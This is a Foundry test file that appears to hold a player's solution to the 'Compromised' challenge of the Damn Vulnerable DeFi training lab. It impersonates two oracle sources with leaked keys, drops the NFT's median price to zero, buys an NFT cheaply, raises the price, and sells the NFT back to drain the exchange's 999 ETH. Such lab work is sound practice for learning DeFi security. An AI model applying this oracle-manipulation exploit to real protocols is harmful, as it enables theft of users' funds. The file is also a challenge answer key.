// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract AttackCompromised {
    Exchange exchange;
    uint256 tokenId;
    address recovery;
    DamnValuableNFT nft;

    constructor(Exchange _exchange, DamnValuableNFT _nft, address _recovery) payable {
        exchange = _exchange;
        recovery = _recovery;
        nft = _nft;
    }

    function attackBuy() public {
        tokenId = exchange.buyOne{value: 0.1 ether}();
    }

    function attackSell() public {
        nft.approve(address(exchange), tokenId);
        exchange.sellOne(tokenId);
    }

    function attackRecover(uint256 amount) public {
        payable(recovery).transfer(amount);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}

contract CompromisedChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;


    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nft = exchange.token();

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(nft.owner(), address(0)); // ownership renounced
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_compromised() public checkSolved {
        // note: apparently the oracle and exchange is not compromised, its just that the private keys of the sources 0 & 1 are leaked (in the readme)
        // so we can just use vm.prank as the sources to adjust their prices
        reducePrice();
        AttackCompromised attack = new AttackCompromised{value: PLAYER_INITIAL_ETH_BALANCE}(exchange, nft, recovery);
        attack.attackBuy();
        increasePrice();
        attack.attackSell();
        attack.attackRecover(EXCHANGE_INITIAL_ETH_BALANCE);
    }

    function reducePrice() internal {
        vm.startPrank(sources[0]);
        oracle.postPrice(symbols[0], 0);
        vm.stopPrank();
        vm.startPrank(sources[1]);
        oracle.postPrice(symbols[1], 0);
        vm.stopPrank();
    }

    function increasePrice() internal {
        vm.startPrank(sources[0]);
        oracle.postPrice(symbols[0], EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();
        vm.startPrank(sources[1]);
        oracle.postPrice(symbols[1], EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0);

        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0);

        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
